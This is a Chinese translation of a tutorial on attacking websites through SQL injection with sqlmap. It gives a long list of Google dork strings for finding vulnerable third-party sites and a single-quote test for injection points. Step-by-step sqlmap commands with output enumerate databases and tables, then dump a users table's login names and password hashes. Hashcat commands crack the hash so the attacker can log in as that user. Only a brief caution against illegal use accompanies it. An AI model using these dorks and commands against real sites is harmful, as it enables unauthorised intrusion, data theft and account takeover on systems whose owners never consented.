# 使用SQLMAP对网站和数据库进行SQL注入攻击

from：http://www.blackmoreops.com/2014/05/07/use-sqlmap-sql-injection-hack-website-database/

0x00 背景介绍
---------

* * *

### 1. 什么是SQL注入？

SQL注入是一种代码注入技术，过去常常用于攻击数据驱动性的应用，比如将恶意的SQL代码注入到特定字段用于实施拖库攻击等。SQL注入的成功必须借助应用程序的安全漏洞，例如用户输入没有经过正确地过滤（针对某些特定字符串）或者没有特别强调类型的时候，都容易造成异常地执行SQL语句。SQL注入是网站渗透中最常用的攻击技术，但是其实SQL注入可以用来攻击所有的SQL数据库。在这个指南中我会向你展示在Kali Linux上如何借助SQLMAP来渗透一个网站（更准确的说应该是数据库），以及提取出用户名和密码信息。

### 2. 什么是SQLMAP？

SQLMAP是一个开源的渗透测试工具，它主要用于自动化地侦测和实施SQL注入攻击以及渗透数据库服务器。SQLMAP配有强大的侦测引擎，适用于高级渗透测试用户，不仅可以获得不同数据库的指纹信息，还可以从数据库中提取数据，此外还能够处理潜在的文件系统以及通过带外数据连接执行系统命令等。

访问SQLMAP的官方网站[http://www.sqlmap.org](http://www.sqlmap.org/)可以获得SQLMAP更为详细的介绍，如它的多项特性，最为突出的是SQLMAP完美支持MySQL、Oracle、PostgreSQL、MS-SQL与Access等各种数据库的SQL侦测和注入，同时可以进行六种注入攻击。

还有很重要的一点必须说明：在你实施攻击之前想想那些网站的建立者或者维护者，他们为网站耗费了大量的时间和努力，并且很有可能以此维生。你的行为可能会以你永远都不希望的方式影响到别人。我想我已经说的够清楚了。（PS：请慎重攻击，不要做违法的事情）

PS：之前在wooyun上看了一些关于SQLMAP的文章，受益匪浅，今天翻译这篇文章，是希望对于如何使用SQLMAP提供一个基本的框架，SQL注入的原理以及SQLMAP详细的命令参数和不同的应用实例可以参考下面的文章：

SQL注射原理：[http://drops.wooyun.org/papers/59](http://drops.wooyun.org/papers/59)

SQLMAP用户手册：[http://drops.wooyun.org/tips/143](http://drops.wooyun.org/tips/143)

SQLMAP实例COOKBOOK：[http://drops.wooyun.org/tips/1343](http://drops.wooyun.org/tips/1343)

0x01 定位注入的网站
------------

* * *

这通常是最枯燥和最耗时的一步，如果你已经知道如何使用Google Dorks（Google dorks sql insection：谷歌傻瓜式SQL注入）或许会有些头绪，但是假如你还没有整理过用于Google搜索的那些字符串的话，可以考虑复制下面的条目，等待谷歌的搜索结果。

### a：利用Google Dorks字符串找到可注入的网站

这个列表很长，如果你也懂得SQL，那么你也可以添加新的条目，记得留言给我。

| Google Dork string Column 1 | Google Dork string Column 2 | Google Dork string Column 3 |
| --- | --- | --- |
| inurl:item_id= | inurl:review.php?id= | inurl:hosting_info.php?id= |
| inurl:newsid= | inurl:iniziativa.php?in= | inurl:gallery.php?id= |
| inurl:trainers.php?id= | inurl:curriculum.php?id= | inurl:rub.php?idr= |
| inurl:news-full.php?id= | inurl:labels.php?id= | inurl:view_faq.php?id= |
| inurl:news_display.php?getid= | inurl:story.php?id= | inurl:artikelinfo.php?id= |
| inurl:index2.php?option= | inurl:look.php?ID= | inurl:detail.php?ID= |
| inurl:readnews.php?id= | inurl:newsone.php?id= | inurl:index.php?= |
| inurl:top10.php?cat= | inurl:aboutbook.php?id= | inurl:profile_view.php?id= |
| inurl:newsone.php?id= | inurl:material.php?id= | inurl:category.php?id= |
| inurl:event.php?id= | inurl:opinions.php?id= | inurl:publications.php?id= |
| inurl:product-item.php?id= | inurl:announce.php?id= | inurl:fellows.php?id= |
| inurl:sql.php?id= | inurl:rub.php?idr= | inurl:downloads_info.php?id= |
| inurl:index.php?catid= | inurl:galeri_info.php?l= | inurl:prod_info.php?id= |
| inurl:news.php?catid= | inurl:tekst.php?idt= | inurl:shop.php?do=part&id= |
| inurl:index.php?id= | inurl:newscat.php?id= | inurl:productinfo.php?id= |
| inurl:news.php?id= | inurl:newsticker_info.php?idn= | inurl:collectionitem.php?id= |
| inurl:index.php?id= | inurl:rubrika.php?idr= | inurl:band_info.php?id= |
| inurl:trainers.php?id= | inurl:rubp.php?idr= | inurl:product.php?id= |
| inurl:buy.php?category= | inurl:offer.php?idf= | inurl:releases.php?id= |
| inurl:article.php?ID= | inurl:art.php?idm= | inurl:ray.php?id= |
| inurl:play_old.php?id= | inurl:title.php?id= | inurl:produit.php?id= |
| inurl:declaration_more.php?decl_id= | inurl:news_view.php?id= | inurl:pop.php?id= |
| inurl:pageid= | inurl:select_biblio.php?id= | inurl:shopping.php?id= |
| inurl:games.php?id= | inurl:humor.php?id= | inurl:productdetail.php?id= |
| inurl:page.php?file= | inurl:aboutbook.php?id= | inurl:post.php?id= |
| inurl:newsDetail.php?id= | inurl:ogl_inet.php?ogl_id= | inurl:viewshowdetail.php?id= |
| inurl:gallery.php?id= | inurl:fiche_spectacle.php?id= | inurl:clubpage.php?id= |
| inurl:article.php?id= | inurl:communique_detail.php?id= | inurl:memberInfo.php?id= |
| inurl:show.php?id= | inurl:sem.php3?id= | inurl:section.php?id= |
| inurl:staff_id= | inurl:kategorie.php4?id= | inurl:theme.php?id= |
| inurl:newsitem.php?num= | inurl:news.php?id= | inurl:page.php?id= |
| inurl:readnews.php?id= | inurl:index.php?id= | inurl:shredder-categories.php?id= |
| inurl:top10.php?cat= | inurl:faq2.php?id= | inurl:tradeCategory.php?id= |
| inurl:historialeer.php?num= | inurl:show_an.php?id= | inurl:product_ranges_view.php?ID= |
| inurl:reagir.php?num= | inurl:preview.php?id= | inurl:shop_category.php?id= |
| inurl:Stray-Questions-View.php?num= | inurl:loadpsb.php?id= | inurl:transcript.php?id= |
| inurl:forum_bds.php?num= | inurl:opinions.php?id= | inurl:channel_id= |
| inurl:game.php?id= | inurl:spr.php?id= | inurl:aboutbook.php?id= |
| inurl:view_product.php?id= | inurl:pages.php?id= | inurl:preview.php?id= |
| inurl:newsone.php?id= | inurl:announce.php?id= | inurl:loadpsb.php?id= |
| inurl:sw_comment.php?id= | inurl:clanek.php4?id= | inurl:pages.php?id= |
| inurl:news.php?id= | inurl:participant.php?id= |   |
| inurl:avd_start.php?avd= | inurl:download.php?id= |   |
| inurl:event.php?id= | inurl:main.php?id= |   |
| inurl:product-item.php?id= | inurl:review.php?id= |   |
| inurl:sql.php?id= | inurl:chappies.php?id= |   |
| inurl:material.php?id= | inurl:read.php?id= |   |
| inurl:clanek.php4?id= | inurl:prod_detail.php?id= |   |
| inurl:announce.php?id= | inurl:viewphoto.php?id= |   |
| inurl:chappies.php?id= | inurl:article.php?id= |   |
| inurl:read.php?id= | inurl:person.php?id= |   |
| inurl:viewapp.php?id= | inurl:productinfo.php?id= |   |
| inurl:viewphoto.php?id= | inurl:showimg.php?id= |   |
| inurl:rub.php?idr= | inurl:view.php?id= |   |
| inurl:galeri_info.php?l= | inurl:website.php?id= |   |

### b：初始验证网站是否可以进行SQL注入

上面的字符串搜索之后，也许会得到成百上千的结果，那么如何判断这些网站是否可以进行SQLMAP的注入呢？有很多种方法，我相信大家会争论哪种才是最好的，但是对我而言下面的方法是最简单和最有效的。

我们假设你使用了字符串：inurl:item_id=，然后其中一个结果的网站是：

```
http://www.sqldummywebsite.com/cgi-bin/item.cgi?item_id=15

```

在后面添加添加一个单引号’之后，URL成为了：

```
http://www.sqldummywebsite.com/cgi-bin/item.cgi?item_id=15'

```

如果页面返回一个SQL错误，说明页面存在SQL注入点；如果页面加载正常显示或者重定向到一个不同的页面，跳过这个网站，用同样的方法去测试下一个网站吧！

【PS：现在比较多的可以使用’and 1=1’、‘or 1=1’等测试注入点的存在，这篇文章侧重地是使用SQLMAP注入的思路和整体步骤】

下面是我自己测试时的SQL错误截图：

![2014052914544392535.png](http://drops.javaweb.org/uploads/images/285caa4cc68203915879299e6d8ccc84d6179540.jpg) 

不同的数据库返回的SQL错误或许会有不同，比如：

Microsoft SQL Server

```
Server Error in ‘/’ Application. Unclosed quotation mark before the character string ‘attack;’.

```

描述：Description: An unhanded exception occurred during the execution of the current web request. Please review the stack trace for more information about the error where it originated in the code.

```
Exception Details: System.Data.SqlClient.SqlException: Unclosed quotation mark before the character string ‘attack;’

```

MySQL Errors

```
Warning: mysql_fetch_array(): supplied argument is not a valid MySQL result resource in /var/www/myawesomestore.com/buystuff.php on line 12

Error: You have an error in your SQL syntax: check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’’ at line 12

```

Oracle Errors

```
java.sql.SQLException: ORA-00933: SQL command not properly ended at oracle.jdbc.dbaaccess.DBError.throwSqlException(DBError.java:180) at oracle.jdbc.ttc7.TTIoer.processError(TTIoer.java:208)

Error: SQLExceptionjava.sql.SQLException: ORA-01756: quoted string not properly terminated

```

PostgreSQL Errors

```
Query failed: ERROR: unterminated quoted string at or near “‘’’”

```

0x02 列出DBMS数据库
--------------

* * *

正如上图你看到的，我找到了一个存在SQL注入点的网站。现在我需要列出所有的数据库（有时这也称为枚举列数）。因为我一直在使用SQLMAP，它会告诉我哪个存在漏洞。

运行下面的命令，参数是你找到的存在注入点的网址：

```
sqlmap -u http://www.sqldummywebsite.com/cgi-bin/item.cgi?item_id=15 --

```

我们现在看到两个数据库，其中的information_schema是几乎所有MySQL数据库默认的标准数据库，所以我们的兴趣主要在sqldummywebsite数据库上。

这里的参数：

```
sqlmap：SQLMAP可执行文件的名称，也可使用python sqlmap.py来替代
-u：目标URL
--dbs：枚举DBMS数据库

```

0x03 列出目标数据库的表
--------------

* * *

现在我们需要知道在数据库sqldummywebsite中都有哪些表，为了弄清这些信息，我们使用下面的命令：

```
sqlmap -u http://www.sqldummywebsite.com/cgi-bin/item.cgi?item_id=15 -D sqldummywebsite --tables

```

我们发现这个数据有8张表：

```
[10:56:20] [INFO] fetching tables for database: 'sqldummywebsite'
[10:56:22] [INFO] heuristics detected web page charset 'ISO-8859-2'
[10:56:22] [INFO] the SQL query used returns 8 entries
[10:56:25] [INFO] retrieved: item
[10:56:27] [INFO] retrieved: link
[10:56:30] [INFO] retrieved: other
[10:56:32] [INFO] retrieved: picture
[10:56:34] [INFO] retrieved: picture_tag
[10:56:37] [INFO] retrieved: popular_picture
[10:56:39] [INFO] retrieved: popular_tag
[10:56:42] [INFO] retrieved: user_info

```

![2014052914585030373.png](http://drops.javaweb.org/uploads/images/d1cfcbf9b07c35ce80fb1366a805ddac4904607b.jpg) 

显而易见，我们的兴趣主要在表user_info中，因为这张表中包含着数据库的用户名和密码。

0x04 列出指定数据库中的列
---------------

* * *

现在我们需要列出数据库sqldummywebsite的表user_info中的所有的列，使用SQLMAP进行这一步会非常简单，运行下面的命令：

```
sqlmap -u http://www.sqldummywebsite.com/cgi-bin/item.cgi?item_id=15 -D sqldummywebsite -T user_info --columns

```

命令返回5个段:

```
[10:57:16] [INFO] fetching columns for table 'user_info' in database 'sqldummywebsite'
[10:57:18] [INFO] heuristics detected web page charset 'ISO-8859-2'
[10:57:18] [INFO] the SQL query used returns 5 entries
[10:57:20] [INFO] retrieved: user_id
[10:57:22] [INFO] retrieved: int(10) unsigned
[10:57:25] [INFO] retrieved: user_login
[10:57:27] [INFO] retrieved: varchar(45)
[10:57:32] [INFO] retrieved: user_password
[10:57:34] [INFO] retrieved: varchar(255)
[10:57:37] [INFO] retrieved: unique_id
[10:57:39] [INFO] retrieved: varchar(255)
[10:57:41] [INFO] retrieved: record_status
[10:57:43] [INFO] retrieved: tinyint(4)

```

![2014052915004160941.png](http://drops.javaweb.org/uploads/images/532965c3b6990649bf7db9e8304de9209a0d52f6.jpg) 

哈哈！其中的`user_login`和`user_password`字段就是我们要找的！

0x05 从指定的数据库的表中列出用户名
--------------------

* * *

SQLMAP的SQL注入非常简单！再次运行下面的命令吧：

```
sqlmap -u http://www.sqldummywebsite.com/cgi-bin/item.cgi?item_id=15 -D sqldummywebsite -T user_info -C user_login --dump

```

现在我们有了数据库的用户名了：

```
[10:58:39] [INFO] retrieved: userX
[10:58:40] [INFO] analyzing table dump for possible password hashes

```

![2014052915114612604.png](http://drops.javaweb.org/uploads/images/606fa2df50880af4849206fb429c2546efc044ba.jpg)

现在我们只需要这个用户的密码了，下面就来介绍如何得到密码！

0x06 提取用户密码
-----------

* * *

你可能已经习惯如何使用SQLMAP了！使用下面的参数来提取密码字段的数值吧！

```
sqlmap -u http://www.sqldummywebsite.com/cgi-bin/item.cgi?item_id=15 -D sqldummywebsite -T user_info -C user_password --dump

```

现在我们得到密码字段了：

```
[10:59:15] [INFO] the SQL query used returns 1 entries
[10:59:17] [INFO] retrieved: 24iYBc17xK0e.
[10:59:18] [INFO] analyzing table dump for possible password hashes
Database: sqldummywebsite
Table: user_info
[1 entry]
+---------------+
| user_password |
+---------------+
| 24iYBc17xK0e. |
+---------------+

```

![2014052915045923606.png](http://drops.javaweb.org/uploads/images/2b5eb402aeef55471e24ef348b4315bfdbc2f1a9.jpg)

虽然我们得到了密码字段的值，但是却是密码的HASH值，现在我们需要解密这个密码了。我之前已经探讨过在Kali Linux上如何解密MD5、phpBB、MySQL和SHA-1。

你可以参考：

[http://www.blackmoreops.com/2014/03/26/cracking-md5-phpbb-mysql-and-sha1-passwords-with-hashcat/](http://www.blackmoreops.com/2014/03/26/cracking-md5-phpbb-mysql-and-sha1-passwords-with-hashcat/)

下面简要地介绍如何使用hashcat来破解MD5。

0x07 破解密码
---------

* * *

现在密码字段的值是 24iYBc17xK0e ，你首先应当判断HASH的类型。

### a：识别HASH类型

幸运地是，Kali Linux提供了可以用来鉴别HASH类型的工具，只需要命令行下敲入命令:

Hash-identifier

然后根据提示提供HASH值就可以了：

![2014052915061762603.png](http://drops.javaweb.org/uploads/images/2a402a228e4a7ba3879a4d2e23efaec6d38c941d.jpg) 

所以这是一个DES(Unix) HASH。

【PS：实际中HASH加密使用几种形式，如*nix系统、MD5(Unix)等，详细内容可以参考HASH加密类型传送门：[http://zone.wooyun.org/content/2471](http://zone.wooyun.org/content/2471)】

### b：使用cudahashcat破解HASH

首先我们必须知道DES HASH使用的代码，运行命令：

```
cudahashcat --help | grep DES

```

【PS：这里的cudahashcat是借助GPU进行破解的工具，下面提到的oclHashcat也是同样的工具，详细介绍与用法可以参考HASHCAT使用简介传送门：[http://drops.wooyun.org/tools/655](http://drops.wooyun.org/tools/655)】

![2014052915070592604.png](http://drops.javaweb.org/uploads/images/e5ec07439cca13b3a37b58f70c5301a377dc40c8.jpg) 

如图所示：代码要么是1500要么是3100，因为目标是一个MySQL数据库，所以一定是1500.我运行的电脑使用的是NVDIA显卡，因此我可以使用cudaHashcat；我的笔记本是AMD显卡，那么我就只能使用oclHashcat破解MD5.如果你运行在VirtualBox或者VMWare上，你既不能使用cudahashcat也不能使用oclhashcat，你必须安装Kali Linux。

我将HASH值存储在DES.hash文件中，然后运行命令：

```
cudahashcat -m 1500 -a 0 /root/sql/DES.hash /root/sql/rockyou.txt

```

![2014052915081195605.png](http://drops.javaweb.org/uploads/images/ef15a3c01e3282453b1de8b78ae14b48e5dc55ec.jpg) 

现在我们得到了破解的密码：abc123，接下来我们就可以使用这个用户的身份登录了。